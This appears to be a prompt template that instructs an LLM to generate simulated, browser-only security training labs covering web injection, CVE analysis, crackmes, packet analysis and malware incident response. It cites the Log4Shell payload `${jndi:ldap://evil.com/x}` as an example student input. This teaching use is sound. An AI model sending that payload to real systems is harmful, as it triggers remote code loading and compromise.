# Security Analysis Lab Generator

You generate a **rich, hands-on interactive security lab** as a single HTML document. Students WORK through a realistic scenario — exploiting, reverse-engineering, analyzing, patching — entirely in the browser. **Minimize multiple-choice quizzes. Maximize active doing: type payloads, write code, click vulnerabilities, capture flags, manipulate data.**

{{#if subjectProfile}}{{snippet:security-code-policy}}{{/if}}

## Lab to generate
- Topic/scenario: {{topic}}
- Context/description: {{description}}
- Key points: {{keyPoints}}
- Language: {{languageDirective}}

{{#if securityKnowledge}}{{securityKnowledge}}{{/if}}

## Step 1: Determine the lab category

Based on the topic and description, pick ONE category and build the appropriate hands-on experience:

### Category A: Web Attack Lab (SQLi / XSS / CSRF / SSRF / command injection)
**When**: topic mentions web, login, form, injection, XSS, CSRF.
**Hands-on elements**:
- A realistic vulnerable mini-app (login form, comment box, search field) with pure-JS mock backend. NO network requests.
- Input field where the student TYPES the attack payload.
- On submit: VISUALIZE the internal processing (the assembled SQL string / the rendered DOM / the executed command) so the student SEES the vulnerability happen in real-time.
- Success/failure detection with explanation of WHY the payload worked.
- **Write-the-fix challenge**: after exploiting, the student TYPES the corrected code (e.g. parameterized query). The system diffs their input against the correct patch and highlights matches/gaps.
- **Defense comparison** toggle: vulnerable code ↔ patched code side-by-side.

### Category B: CVE / Vulnerability Deep-Dive (root cause → exploit → patch)
**When**: topic mentions CVE, vulnerability analysis, patch, root cause, buffer overflow, use-after-free, race condition, Log4Shell, etc.
**Hands-on elements (NO multiple choice — all active)**:
- **Vulnerability hunt**: show the vulnerable code (~15-30 lines, realistic). The student CLICKS the line they think is vulnerable. Correct click → highlight + explain. Wrong click → hint. Track which lines they've tried.
- **Exploit constructor**: a text input where the student TYPES the trigger input/payload that exploits the vulnerability (e.g. `${jndi:ldap://evil.com/x}` for Log4Shell, or `AAAA...` overflow for buffer overflow). On submit, SIMULATE the effect visually (memory layout shifts, JNDI lookup fires, query executes). If the exploit is correct → reveal the **flag**.
- **Flag capture**: embed a flag (e.g. `FLAG{cve_2021_44228_jndi_injection}`) that is ONLY revealed when the student successfully constructs the exploit. The flag appears in the simulated output (memory dump, log entry, error message).
- **Patch authoring**: given the vulnerable line, the student TYPES the fix (one line or a short snippet). The system compares against the real patch and shows a visual diff (green=correct, red=missing/wrong). Provide a "reveal patch" button if stuck.
- **Exploit path builder**: a visual chain where the student CLICKS steps in the correct order (e.g. "user input → template lookup → JNDI resolve → LDAP query → remote classload → RCE"). Reorder by clicking. Correct order → chain lights up.
- **Impact visualization**: show CVSS vector as interactive badges (not a quiz — just informational, click to expand each metric's meaning).

### Category C: Binary Reverse Engineering (crackme / CTF / disassembly)
**When**: topic mentions reverse engineering, crackme, binary, disassembly, flag, CTF, anti-debug.
**Hands-on elements**:
- **Disassembly view**: ~20-40 lines of pseudo-assembly or heavily obfuscated JS (names like `v_0x4c2`, `f3b`). Some lines have comments (as a real disassembler would).
- **Interactive step tracer**: buttons "单步" / "运行到光标" / "设断点" that execute the code line by line, updating a **state panel** (registers, stack, variables) in real-time. The student MUST step through to understand the logic.
- **Flag input**: the binary contains a hidden key/license check. The student traces the logic, computes the correct key, TYPES it in. On correct → "🎯 Flag captured!" + deobfuscated code revealed.
- **Write the bypass**: for anti-debug checks — the student TYPES what value to patch (e.g. "set ZF=1" or "nop the jump"). System simulates the patch.
- **Memory inspector**: a hex view of the "binary's" memory that updates as the student steps. Hidden strings/flags appear when the right memory region is examined.

### Category D: Protocol Analysis (packet inspection / MITM / handshake)
**When**: topic mentions protocol, packet, TCP, TLS, handshake, MITM, replay, Wireshark, traffic.
**Hands-on elements (NOT radio buttons — active investigation)**:
- **Packet list**: a table of 8-15 captured packets (#, time, src, dst, protocol, length, info) — styled like Wireshark. The student CLICKS rows to inspect.
- **Packet detail panel**: on click, show parsed layer fields + hex dump. The student must READ the fields to find anomalies.
- **Anomaly tagging**: the student CLICKS suspicious packets to TAG them (they get highlighted). After tagging, a "验证分析" button checks if they found the right ones. Wrong → explain why that packet is actually normal. Right → reveal the attack explanation.
- **Write your analysis**: a text area where the student TYPES a one-sentence analysis of what the attack is doing (e.g. "攻击者通过伪造 ServerHello 将 TLS 降级到 SSLv3"). The system does keyword matching against expected analysis points and highlights which they got right.
- **Reconstruct the attack**: after identifying anomalous packets, CLICK them in chronological order to build the attack timeline. Correct order → animated attack chain.

### Category E: Malware / Incident Analysis
**When**: topic mentions malware, ransomware, APT, incident response, forensics, IOC, C2, persistence.
**Hands-on elements (NOT checklist — active investigation)**:
- **Evidence board**: mock artifacts displayed as cards (process list, registry key, scheduled task, network log, encoded command). The student CLICKS an artifact to EXPAND it (show raw data).
- **IOC extraction**: the student TYPES extracted IOCs (IP, hash, domain) into input fields. System validates against the evidence. Correct IOC → added to a "confirmed IOCs" board with green check.
- **Decode the payload**: an encoded command (base64/hex/XOR) is shown. The student TYPES the decoded result. System validates.
- **Build the kill chain**: drag/click attack stages (initial access → execution → persistence → C2 → impact) into order. Correct → animated timeline.
- **Write the report**: a text area for a one-paragraph incident summary. System checks for key elements (entry vector, propagation, impact, recommended actions).

## Mandatory answer-evidence contract

Every graded task MUST be solvable from information that the learner can actually observe or derive inside the lab.

- For each graded `<input>`, add `data-graded-input` and `data-answer-source="SOURCE_ELEMENT_ID"`. The referenced evidence element must exist in the HTML and become visible before or while the learner reaches that input.
- A correct answer MUST NOT exist only in JavaScript validation code, an object such as `correctAnswers`, or a hidden variable.
- If a task asks for a file Hash/MD5/SHA-1/SHA-256, display the exact digest in an observable artifact such as “File Properties”, an EDR alert, an event log, a process detail panel, or a packet/evidence card. The learner must be able to select and copy it. A placeholder saying “enter the hash” is not evidence.
- For IPs, domains, ports, registry paths, filenames, keys, payloads, flags, and passwords, make the source explicit in a log, raw evidence view, trace, memory panel, or derivation instruction.
- Derived answers may require reasoning, but provide a progressive hint or “reveal evidence” control so a stuck learner can still finish the exercise.
- Every completion gate must have a reachable success path, and reset must restore all state required to attempt that path again.
- Before returning HTML, perform a self-audit: for every comparison made by the checker, trace the expected value back to its visible/revealable `data-answer-source`. Fix any orphaned answer before output.

Example of the required relationship:

```html
<code id="sample-sha256-evidence">2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881</code>
<input id="iocHash" data-graded-input data-answer-source="sample-sha256-evidence">
```

## Step 2: Universal requirements (ALL categories)

1. **Scenario briefing**: start with a "任务简报" card — 2-3 sentences setting the scene.
2. **Progress tracking**: show step progress ("步骤 2/4 — 漏洞利用").
3. **Active engagement principle**: the student TYPES, CLICKS, WRITES CODE, or MANIPULATES at every step. Avoid passive reading or multiple-choice. If you must ask a question, make it open-ended (text input) not A/B/C/D.
4. **Flag/achievement system**: embed at least one FLAG or ACHIEVEMENT that unlocks upon successful completion. This gives a sense of accomplishment (like CTF).
5. **Rich visual feedback**: every action produces a visible response (animation, color change, state update, new data appearing). Wrong actions get hints, not just "错误".
6. **Analysis report** toggle: a "查看完整分析" button reveals the full writeup (root cause, exploit chain, defense, real-world references).
7. **Dark theme**: background #0f172a or #1a1a2e, monospace for code, color-coded sections (danger=red #ef4444, success=green #22c55e, info=blue #3b82f6, flag=amber #f59e0b).
8. **Educational framing**: `// EDUCATIONAL PURPOSE ONLY` comment at the top.
9. **All text in the teaching language** ({{languageDirective}}).

## Step 3: Output

Return exactly ONE complete HTML document (<!doctype html>...</html>).
- No markdown fences, no explanation outside the HTML.
- Fully self-contained: inline CSS + JS, no external resources (CDN fonts OK).
- Target 1000-2500 lines for a rich, multi-step experience.
- Use CSS Grid/Flexbox for layout. Use <details>/<summary> for collapsible sections.
- All interactivity via vanilla JS (no frameworks).
- Use CSS transitions/animations for feedback (fade, slide, pulse on success).
